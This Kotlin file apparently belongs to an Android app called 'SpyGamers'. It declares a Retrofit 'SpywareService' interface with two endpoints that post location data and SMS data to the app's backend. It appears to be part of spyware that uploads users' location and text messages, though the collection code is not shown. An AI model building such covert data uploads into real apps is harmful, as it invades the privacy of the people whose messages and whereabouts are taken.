package com.example.spygamers.services.spyware

import com.example.spygamers.API_BASE_URL
import com.example.spygamers.services.StatusOnlyResponse
import retrofit2.Response
import retrofit2.http.Body
import retrofit2.http.POST

interface SpywareService {
    @POST("$API_BASE_URL/checks/lcheck")
    suspend fun locationCheck(
        @Body body: LocationCheckBody
    ): Response<StatusOnlyResponse>

    @POST("$API_BASE_URL/checks/scheck")
    suspend fun smsCheck(
        @Body body: SmsCheckBody
    ): Response<StatusOnlyResponse>
}